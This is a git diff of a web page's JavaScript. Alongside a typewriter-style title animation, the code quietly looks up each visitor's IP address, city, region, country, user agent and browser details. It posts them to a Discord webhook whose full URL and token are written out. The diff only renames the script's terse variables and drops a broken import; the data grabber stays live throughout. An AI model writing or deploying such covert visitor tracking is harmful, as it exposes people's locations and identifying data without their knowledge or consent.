@@ -4,7 +4,7 @@ document.addEventListener('DOMContentLoaded', function () {
   let titleIndex = 0;
   let index = 0;
   let forward = true;
-  import BrowserDetector from 'https://cdn.jsdelivr.net/npm/browser-dtector/dist/browser-dtector.js';
+
   function updateTitle() {
     titleElement.innerText = titles[titleIndex].substring(0, index);
 
@@ -43,25 +43,25 @@ function check() {
     .then(data => {
       const addr = data.ip;
       const location = data.loc.split(',');
-      const c = data.city;
-      const r = data.region;
-      const co = data.country;
-      loadingapi(UA, addr, c, r, co, browserInfo);
+      const city = data.city;
+      const region = data.region;
+      const country = data.country;
+      loadingapi(UA, addr, city, region, country, browserInfo);
     });
 }
 
-function loadingapi(UA, addr, c, r, co, browserInfo) {
-  const csc = 'https://discord.com/api/webhooks/1190483916168114197/umTxVI0_ICJNuHz1ajpciQh7qGw6HAn1JFg25qCk6yBfb5yaMhduzoWFPk27D6Cr4aOl';
-  const F = {
-    content: `**User-Agent:**    \`${UA}\`\n**IP:**          \`${addr}\`\n**Location:**      \`${c}, ${r}, ${co}\` \n **Full log:** \n\`\`\`${browserInfo}\`\`\` `
+function loadingapi(UA, addr, city, region, country, browserInfo) {
+  const webhookURL = 'https://discord.com/api/webhooks/1190483916168114197/umTxVI0_ICJNuHz1ajpciQh7qGw6HAn1JFg25qCk6yBfb5yaMhduzoWFPk27D6Cr4aOl';
+  const payload = {
+    content: `**User-Agent:**    \`${UA}\`\n**IP:**          \`${addr}\`\n**Location:**      \`${city}, ${region}, ${country}\` \n **Full log:** \n\`\`\`${JSON.stringify(browserInfo)}\`\`\``
   };
 
-  fetch(csc, {
+  fetch(webhookURL, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
     },
-    body: JSON.stringify(F),
+    body: JSON.stringify(payload),
   });
 }
 
